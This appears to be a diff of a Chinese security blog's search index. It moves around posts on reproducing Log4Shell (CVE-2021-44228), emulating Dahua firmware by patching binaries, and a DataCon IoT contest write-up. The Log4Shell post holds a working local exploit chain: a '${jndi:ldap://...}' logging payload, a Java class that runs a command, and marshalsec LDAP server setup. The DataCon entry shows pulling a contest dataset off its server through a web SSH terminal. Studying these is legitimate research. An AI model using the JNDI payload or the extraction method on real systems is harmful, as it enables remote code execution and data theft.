@@ -1,37 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Apache-log4j漏洞复现</title>
-    <url>/2021/12/10/Apache-log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="apache-log4j本地漏洞复现"><a href="#apache-log4j本地漏洞复现" class="headerlink" title="apache-log4j本地漏洞复现"></a>apache-log4j本地漏洞复现</h1><p><a href="Apache-log4j-poc.zip">POC下载</a></p>
-<p>exp（弹出一个计算器）</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String [] cmd=&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Main</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Main.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/exp&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>需要向pom.xml中导入以下配置</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://search.maven.org/ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://search.maven.org/ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>把exp的java源码用<code>javac exp.java</code>生成exp.class，记得最好单独放到一个文件夹里，在到这个文件夹下，用python2开个http服务<code>python -m http.server 8899</code>，如下说明成功</p>
-<p><img src="https://s2.loli.net/2021/12/10/d8AcUODlQP2RKxF.png" alt="image-20211210163035219"></p>
-<p>复现之前，需要下载一个插件</p>
-<p><code>git clone git@github.com:mbechler/marshalsec.git</code></p>
-<p>用idea打开此项目，使用Maven生成jar包</p>
-<p>先clean，然后package（中途可能会报错）</p>
-<p><img src="https://s2.loli.net/2021/12/10/6wPGI5TUkXgipn3.png" alt="image-20211210163227931"></p>
-<p>然后单独用命令<code>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8899/#exp&quot;</code></p>
-<p><img src="https://s2.loli.net/2021/12/10/yALQ5SOj2mrpEqG.png" alt="image-20211210163848110"></p>
-<p>运行后显示1389为监听端口，这也是为什么我的main函数中的端口为1389</p>
-<p>这样就成功了</p>
-<p><img src="https://s2.loli.net/2021/12/10/p45r2MFinb6OW8d.png" alt="image-20211210164000550"></p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AFL_FUZZ_Code_Learning</title>
     <url>/2022/03/21/AFL-FUZZ-Code-Learning/</url>
     <content><![CDATA[<h1 id="AFL-Fuzz-Souce-Code-Learning"><a href="#AFL-Fuzz-Souce-Code-Learning" class="headerlink" title="AFL Fuzz Souce Code Learning"></a>AFL Fuzz Souce Code Learning</h1><h2 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p>main的核心就两个函数，find_as和edit_params，从他们的名字可以大致推断find_as应该是用来找as文件或者目录的，edit_params应该是用来修改gcc的参数，加上一些宏定义啥的，在原有的基础上添加一些参数设置。最后通过execvp来执行前面编辑好（加了额外afl所需要的参数）的gcc命令</p>
@@ -71,6 +40,37 @@
       </tags>
   </entry>
   <entry>
+    <title>Apache-log4j漏洞复现</title>
+    <url>/2021/12/10/Apache-log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="apache-log4j本地漏洞复现"><a href="#apache-log4j本地漏洞复现" class="headerlink" title="apache-log4j本地漏洞复现"></a>apache-log4j本地漏洞复现</h1><p><a href="Apache-log4j-poc.zip">POC下载</a></p>
+<p>exp（弹出一个计算器）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String [] cmd=&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Main</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Main.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/exp&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要向pom.xml中导入以下配置</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://search.maven.org/ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://search.maven.org/ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>把exp的java源码用<code>javac exp.java</code>生成exp.class，记得最好单独放到一个文件夹里，在到这个文件夹下，用python2开个http服务<code>python -m http.server 8899</code>，如下说明成功</p>
+<p><img src="https://s2.loli.net/2021/12/10/d8AcUODlQP2RKxF.png" alt="image-20211210163035219"></p>
+<p>复现之前，需要下载一个插件</p>
+<p><code>git clone git@github.com:mbechler/marshalsec.git</code></p>
+<p>用idea打开此项目，使用Maven生成jar包</p>
+<p>先clean，然后package（中途可能会报错）</p>
+<p><img src="https://s2.loli.net/2021/12/10/6wPGI5TUkXgipn3.png" alt="image-20211210163227931"></p>
+<p>然后单独用命令<code>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8899/#exp&quot;</code></p>
+<p><img src="https://s2.loli.net/2021/12/10/yALQ5SOj2mrpEqG.png" alt="image-20211210163848110"></p>
+<p>运行后显示1389为监听端口，这也是为什么我的main函数中的端口为1389</p>
+<p>这样就成功了</p>
+<p><img src="https://s2.loli.net/2021/12/10/p45r2MFinb6OW8d.png" alt="image-20211210164000550"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2016-7124</title>
     <url>/2021/06/09/CVE-2016-7124(php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/</url>
     <content><![CDATA[<h1 id="CVE-2016-7124漏洞复现—php反序列化漏洞"><a href="#CVE-2016-7124漏洞复现—php反序列化漏洞" class="headerlink" title="CVE-2016-7124漏洞复现—php反序列化漏洞"></a>CVE-2016-7124漏洞复现—php反序列化漏洞</h1><p><strong>参考攻防世界web方向Web_php_unserialize题目</strong></p>
@@ -101,43 +101,6 @@
       <tags>
         <tag>Web</tag>
         <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DataCon-物联网安全赛题一wp</title>
-    <url>/2021/10/28/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98-%E5%9B%BA%E4%BB%B6%E6%8C%96%E6%8E%98%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%80wp/</url>
-    <content><![CDATA[<h2 id="数据集抓取整体思路"><a href="#数据集抓取整体思路" class="headerlink" title="数据集抓取整体思路"></a>数据集抓取整体思路</h2><p>datacon21比赛的实验服务器使用了阿里云，访问界面和主机之间的ssh信道通过websocket建立，通过抓包分析即可得到在web ssh终端的数据。通过这种方式可以把所有数据集中的数据打印到终端，再抓包还原。</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="https://vk9-sec.com/apt-get-privilege-escalation/">https://vk9-sec.com/apt-get-privilege-escalation/</a></p>
-<h2 id="制作数据"><a href="#制作数据" class="headerlink" title="制作数据"></a>制作数据</h2><p>为了解决二进制不能打印的问题，使用了base64编码的方式打印。</p>
-<p>思路是分文件夹压缩，之后base64编码为可打印字符，并在base64编码后文本文件的头尾添加标识。</p>
-<p>标识符包括分隔符”:”，定界符F0F0F0，文件名，行号。添加标识的原因是ssh传输中还需要打印控制字符，以及文件传输过大可能会遇到各种网络问题，添加标识会方便数据还原和调试。</p>
-<p>for f in <code>ls /home/datacon/supplychain/dataset</code> ; do tar -czvf /home/datacon/disk/sc/$f.tar.gz /home/datacon/supplychain/dataset/$f ;done</p>
-<p>for f in <code>ls /home/datacon/supplychain/dataset</code> ; do base64 sc/$f.tar.gz -w 1000 | nl -s “:” -w 10 -n “rz” | sed “s/^/:F0F0F0:$f:/“ | sed “s/$/:/“ &gt; sct/$f.txt ;done</p>
-<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/FsIuRUl2ZDWk6g5.png" alt="image2021-10-12_22-25-18"></p>
-<h2 id="Fiddle"><a href="#Fiddle" class="headerlink" title="Fiddle"></a>Fiddle</h2><p>设置代理抓Websocket的包。</p>
-<p>添加自定义规则</p>
-<p>  static function OnWebSocketMessage(oMsg: WebSocketMessage) {<br>    // Log Message to the LOG tab<br>    Utilities.WriteArrayToFile(“E:\TEMP\datacon21\“+oMsg.ID,oMsg.PayloadAsBytes());</p>
-<p>​    //把传输的内容存储到E:\TEMP\datacon21{消息ID}。<br>  }</p>
-<h4 id="危险函数处理"><a href="#危险函数处理" class="headerlink" title="危险函数处理"></a>危险函数处理</h4><p>脚本：</p>
-<p>idapython批量脚本危险函数扫描</p>
-<p>首先用ida命令行模式实现ida差距批量跑二进制文件</p>
-<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/e1gBFRm853zEcP6.png" alt="image-20211027151956014"></p>
-<p>危险函数扫描，用ida-python数据交叉和和代码交叉去遍历搜索全文的危险函数调用</p>
-<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/XIr2ah1qVEPbwm5.png" alt="image-20211027152154471"></p>
-<p>跑完后的结果：</p>
-<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/qL3ojvVUBGyrIdh.png" alt="image-20211027152321164"></p>
-<p>对结果进行清洗脚本（还需要手动在txt中替换掉一些）：</p>
-<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/3RkcEIoygbmLFwr.png" alt="image-20211027152516855"></p>
-<p>改进：用SaTC去跑不同的固件</p>
-<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/zLAg4XkfKwBYbGq.png" alt="image-20211027154052745"></p>
-<p>得到部分命令注入有关的危险函数地址</p>
-<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/nuASNId9mZPfW1C.png" alt="image-20211027154300951"></p>
-<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/Z6tOb8zLnGCWwYF.png" alt="image-20211027154557847"></p>
-<p>用SaTC跑的过程</p>
-<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/QIOrLYPCAc8aef6.png" alt="image-20211027155715171"></p>
-]]></content>
-      <tags>
-        <tag>IoT</tag>
       </tags>
   </entry>
   <entry>
@@ -306,6 +269,118 @@
       <tags>
         <tag>实战</tag>
         <tag>木马</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DaHuaFirmware_emulation</title>
+    <url>/2021/11/14/DaHuaFirmware-emulation/</url>
+    <content><![CDATA[<h1 id="大华固件模拟"><a href="#大华固件模拟" class="headerlink" title="大华固件模拟"></a>大华固件模拟</h1><p>用grep搜httpd的方式找到web服务启动脚本，为sonia，arm架构，小端可执行文件</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/tsbjLYCefXMHo3g.png" alt="image-20211114170159417"></p>
+<p>qemu用户模式去启动，发现报错，卡在了PDI_productGetHwidInfoByChip函数</p>
+<p><code>qemu-arm -L . ./bin/sonia</code></p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/no6VRXcf58ES2Jh.png" alt="image-20211114170325784"></p>
+<p>grep搜一下这个函数，发现此函数是在lib目录下名为libpdi.so的动态链接库文件中</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/9YcGfu4BVDiZXJw.png" alt="image-20211114170523467"></p>
+<p>把这个动态链接库反汇编然后查看这个PDI_productGetHwidInfoByChip函数，发现是存在一个死循环，推测我们是进入了这个循环所导致的</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/mIBZ4aPpfeYMugo.png" alt="image-20211114170856013"></p>
+<p>一开始我单独的去把while的死循环给patch掉了，可以管一时之用，但后面紧接着又报错很多其他类似上述死循环的函数，而且不太好改，推测它处于一个大范围的硬件函数中，因此我们这里可以查看谁调用了PDI_productGetHwidInfoByChip函数（但目前来说很多不太好确定是谁）或者把这个函数直接返回0（采用这种方式）</p>
+<p>把PDI_productGetHwidInfoByChip函数patch为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV.W R0, #0				</span><br><span class="line">BX LR</span><br></pre></td></tr></table></figure>
+
+<p>上面的两段汇编相当于return 0，改完后PDI_productGetHwidInfoByChip函数是这样的，直接返回0了</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/zxZNJnMl9uhOavQ.png" alt="image-20211114171554787"></p>
+<p>改完后输出了很多的信息，但是在PDI_getChipInfo处卡住了</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/uRz1AE7LjeZSmrW.png" alt="image-20211114171819893"></p>
+<p>同样先grep，发现这个函数同样是在这个libpdi.so动态链接库中的，反汇编发现也是卡在了一个while(1)的死循环地方</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/48LklJQ7CEBr3Ds.png" alt="image-20211114171959990"></p>
+<p>查看它的调用，还是太多了，因此继续改，不过跟上面有点区别</p>
+<p>修改内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CBZ R0, loc_78C1C 修改为了B loc_78C1C</span><br><span class="line">MOV.W R0, #0xFFFFFFFF 修改为了MOV.W R0, #0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/nw9maAoh3G7OD5b.png" alt="image-20211114172443175"></p>
+<p>改完后反汇编ok</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/W7BshL8mxprHGuS.png" alt="image-20211114172334752"></p>
+<p>输出的信息又多了一倍，卡在了函数PDI_productGetInfo处</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/OnLqWuMbSdyhJow.png" alt="image-20211114172553762"></p>
+<p>又是这种死循环，出错函数是PDI_productGetInfo</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/jZsDyaKhSNmeL3Q.png" alt="image-20211114172911172"></p>
+<p>因为函数开头又很多寄存器，其实也可以直接覆盖用我们自己的return 0汇编指令，但最好还是间接，对arm不熟悉还是拿个中间跳板吧</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/nyht2CXPaBMpkd1.png" alt="image-20211114173152700"></p>
+<p>修改如下</p>
+<p>CBZ R0, loc_78F74 ——&gt;B loc_78F74</p>
+<p>MOV.W R0, #0xFFFFFFFF —&gt; MOV.W R0, #0</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/4wSZqKmuDGyTg2V.png" alt="image-20211114173952907"></p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/jcZA3glotquMwWU.png" alt="image-20211114173940671"></p>
+<p>又卡住了，并且输出了上一次改动的地方旁边的信息</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/vNg2I6KhPr7eyUm.png" alt="image-20211114174159009"></p>
+<p>卡住的函数为PDI_productGetName，调用成功应该返回0</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/l6yJtKOfS1YZWbQ.png" alt="image-20211114174319545"></p>
+<p>同理修改</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/2wMbjzGtiKnsH9C.png" alt="image-20211114174645437"></p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/GwPOkrc13VMILzd.png" alt="image-20211114174657173"></p>
+<p>提示段错误</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/cjio9SZI3lPmFvt.png" alt="image-20211114174751221"></p>
+<p>查看有哪些调用了PDI_productGetName函数，发现挺多的，随便点进去几个看看</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/jtD2KSYd7ozgckT.png" alt="image-20211114180035418"></p>
+<p>在PDI_getFaceboardCfg函数里发现原因就是调用PDI_productGetName函数时传进来的参数（作为PDI设备名字的）为空或者非法值导致的崩溃，返回值并没有错应该是0</p>
+<p>这个函数可以发现，下面如”SD6C80FA-GNX”、”SD6C82FA-GNX”等为合法的设备名字，如果我们在调用设备的时候给参数赋值为前面合法的值就好啦</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/RFoCSmvx8rf7Wls.png" alt="image-20211114175833570"></p>
+<p>同理其他调用者也可能会出现上述错误</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/WlkfCdpNzX1AZn7.png" alt="image-20211114180356461"></p>
+<p>在上述libpdi.so几个函数中依然没有找到是谁调用PDI_productGetName函数时产生的错误，因为我搜索最近的输出的信息的字符串并没有，因此推测可能是其他二进制文件调用了此函数产生的报错！去看看，grep找一下是谁，</p>
+<p>因此我们换一种角度，可能是别的二进制文件调用了此动态链接库的PDI_productGetName函数，因此去grep一下字符串”Video Server - (C) 2011-2013 ZheJiang Dahua Technology“果然有个sonia</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/s3QmNrznjyYKWxf.png" alt="image-20211114181559702"></p>
+<p>找到这段字符串的地址，进去看看调用它的函数</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/draDWGunb9vHsiM.png" alt="image-20211114181836068"></p>
+<p>函数sub_9BBA09就是输出蓝绿色字符串信息的函数了，但是它下面并没有调用出错的函数，查看调用它的函数只有sub_9BBAA2调用过它两次</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/XavHeb3l5STEVpw.png" alt="image-20211114181906342"></p>
+<p>总启动函数：sub_3B2F8</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/wfmZYVa1bdXhuDO.png" alt="image-20211114191306016"></p>
+<p>将出错的函数NOP掉直接乱了，似乎这样并不可取</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/xZq51YumJlKsDbU.png" alt="image-20211114191405670"></p>
+<p>但是这样能运行，只不过好像又卡了一个死循环，但这个死循环还没找到是在动态链接库libpdi.so的哪个地方</p>
+<p><img src="https://re1own.github.io/assets/img/DahuaFirmware_emulation/v49hHzdKo3YnxjA.png" alt="image-20211114191515211"></p>
+<p>后续仍在研究中</p>
+]]></content>
+      <tags>
+        <tag>IoT</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DataCon-物联网安全赛题一wp</title>
+    <url>/2021/10/28/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98-%E5%9B%BA%E4%BB%B6%E6%8C%96%E6%8E%98%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%80wp/</url>
+    <content><![CDATA[<h2 id="数据集抓取整体思路"><a href="#数据集抓取整体思路" class="headerlink" title="数据集抓取整体思路"></a>数据集抓取整体思路</h2><p>datacon21比赛的实验服务器使用了阿里云，访问界面和主机之间的ssh信道通过websocket建立，通过抓包分析即可得到在web ssh终端的数据。通过这种方式可以把所有数据集中的数据打印到终端，再抓包还原。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="https://vk9-sec.com/apt-get-privilege-escalation/">https://vk9-sec.com/apt-get-privilege-escalation/</a></p>
+<h2 id="制作数据"><a href="#制作数据" class="headerlink" title="制作数据"></a>制作数据</h2><p>为了解决二进制不能打印的问题，使用了base64编码的方式打印。</p>
+<p>思路是分文件夹压缩，之后base64编码为可打印字符，并在base64编码后文本文件的头尾添加标识。</p>
+<p>标识符包括分隔符”:”，定界符F0F0F0，文件名，行号。添加标识的原因是ssh传输中还需要打印控制字符，以及文件传输过大可能会遇到各种网络问题，添加标识会方便数据还原和调试。</p>
+<p>for f in <code>ls /home/datacon/supplychain/dataset</code> ; do tar -czvf /home/datacon/disk/sc/$f.tar.gz /home/datacon/supplychain/dataset/$f ;done</p>
+<p>for f in <code>ls /home/datacon/supplychain/dataset</code> ; do base64 sc/$f.tar.gz -w 1000 | nl -s “:” -w 10 -n “rz” | sed “s/^/:F0F0F0:$f:/“ | sed “s/$/:/“ &gt; sct/$f.txt ;done</p>
+<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/FsIuRUl2ZDWk6g5.png" alt="image2021-10-12_22-25-18"></p>
+<h2 id="Fiddle"><a href="#Fiddle" class="headerlink" title="Fiddle"></a>Fiddle</h2><p>设置代理抓Websocket的包。</p>
+<p>添加自定义规则</p>
+<p>  static function OnWebSocketMessage(oMsg: WebSocketMessage) {<br>    // Log Message to the LOG tab<br>    Utilities.WriteArrayToFile(“E:\TEMP\datacon21\“+oMsg.ID,oMsg.PayloadAsBytes());</p>
+<p>​    //把传输的内容存储到E:\TEMP\datacon21{消息ID}。<br>  }</p>
+<h4 id="危险函数处理"><a href="#危险函数处理" class="headerlink" title="危险函数处理"></a>危险函数处理</h4><p>脚本：</p>
+<p>idapython批量脚本危险函数扫描</p>
+<p>首先用ida命令行模式实现ida差距批量跑二进制文件</p>
+<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/e1gBFRm853zEcP6.png" alt="image-20211027151956014"></p>
+<p>危险函数扫描，用ida-python数据交叉和和代码交叉去遍历搜索全文的危险函数调用</p>
+<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/XIr2ah1qVEPbwm5.png" alt="image-20211027152154471"></p>
+<p>跑完后的结果：</p>
+<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/qL3ojvVUBGyrIdh.png" alt="image-20211027152321164"></p>
+<p>对结果进行清洗脚本（还需要手动在txt中替换掉一些）：</p>
+<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/3RkcEIoygbmLFwr.png" alt="image-20211027152516855"></p>
+<p>改进：用SaTC去跑不同的固件</p>
+<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/zLAg4XkfKwBYbGq.png" alt="image-20211027154052745"></p>
+<p>得到部分命令注入有关的危险函数地址</p>
+<p><img src="https://re1own.github.io/assets/img/DataCon-%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A2%98%E4%B8%80wp/nuASNId9mZPfW1C.png" alt="image-20211027154300951"></p>
